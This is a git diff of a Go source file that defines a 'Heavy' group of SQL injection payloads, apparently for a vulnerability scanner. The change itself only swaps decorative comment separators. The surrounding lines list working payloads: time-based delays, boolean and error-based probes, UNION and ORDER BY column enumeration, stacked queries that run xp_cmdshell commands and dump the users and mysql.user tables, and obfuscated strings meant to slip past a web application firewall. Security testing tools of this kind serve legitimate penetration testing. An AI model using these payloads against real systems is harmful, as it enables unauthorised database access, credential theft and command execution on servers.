@@ -3,9 +3,9 @@ package payloads
 var Heavy = PayloadGroup{
 	DBMS: "Heavy",
 	Payloads: []Payload{
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ADVANCED TIME-BASED (Cross-DBMS)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) a JOIN (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) b JOIN (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) c)--"},
 		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM (SELECT 1)x JOIN (SELECT 1)y JOIN (SELECT 1)z JOIN (SELECT 1)w JOIN (SELECT 1)v)--"},
 		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM (SELECT 1)a,(SELECT 1)b,(SELECT 1)c,(SELECT 1)d,(SELECT 1)e,(SELECT 1)f)--"},
@@ -32,9 +32,9 @@ var Heavy = PayloadGroup{
 		{Type: "time", Content: "1\" OR SLEEP(5) OR \"1\"=\"1"},
 		{Type: "time", Content: "' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000)) > 0--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ADVANCED BOOLEAN (Cross-DBMS)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "' AND '1'='1'--", Expected: "true"},
 		{Type: "boolean", Content: "' AND '1'='2'--", Expected: "false"},
 		{Type: "boolean", Content: "\" AND \"1\"=\"1\"--", Expected: "true"},
@@ -62,9 +62,9 @@ var Heavy = PayloadGroup{
 		{Type: "boolean", Content: "1') AND 1=1--", Expected: "true"},
 		{Type: "boolean", Content: "1') AND 1=2--", Expected: "false"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ADVANCED ERROR-BASED (Cross-DBMS)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "error", Content: "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) a JOIN (SELECT 1 UNION SELECT 2) b)--"},
 		{Type: "error", Content: "' AND (SELECT * FROM (SELECT 1)x JOIN (SELECT 2)y JOIN (SELECT 3)z)--"},
 		{Type: "error", Content: "' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT 1),FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a)--"},
@@ -73,9 +73,9 @@ var Heavy = PayloadGroup{
 		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(ROUND(RAND()*2),(SELECT 1))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a)--"},
 		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,4,5,COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT((SELECT 1),FLOOR(RAND()*2))) a)--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ADVANCED UNION-BASED (Cross-DBMS)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "union", Content: "1' UNION ALL SELECT NULL,NULL,NULL--"},
 		{Type: "union", Content: "1' UNION ALL SELECT NULL,NULL,NULL,NULL--"},
 		{Type: "union", Content: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--"},
@@ -115,9 +115,9 @@ var Heavy = PayloadGroup{
 		{Type: "orderBy", Content: "') ORDER BY 4--"},
 		{Type: "orderBy", Content: "') ORDER BY 5--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ADVANCED STACKED QUERIES
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "stacked", Content: "'; SELECT * FROM users;--"},
 		{Type: "stacked", Content: "'; EXEC xp_cmdshell('whoami');--"},
 		{Type: "stacked", Content: "'; EXEC xp_cmdshell('dir C:\\');--"},
@@ -129,9 +129,9 @@ var Heavy = PayloadGroup{
 		{Type: "stacked", Content: "'; SHOW TABLES;--"},
 		{Type: "stacked", Content: "'; SELECT * FROM mysql.user;--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ADVANCED WAF BYPASS
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "bypass", Content: "' OORR 1=1--"},
 		{Type: "bypass", Content: "' AANDND 1=1--"},
 		{Type: "bypass", Content: "' /*!12345AND*/ 1=1--"},
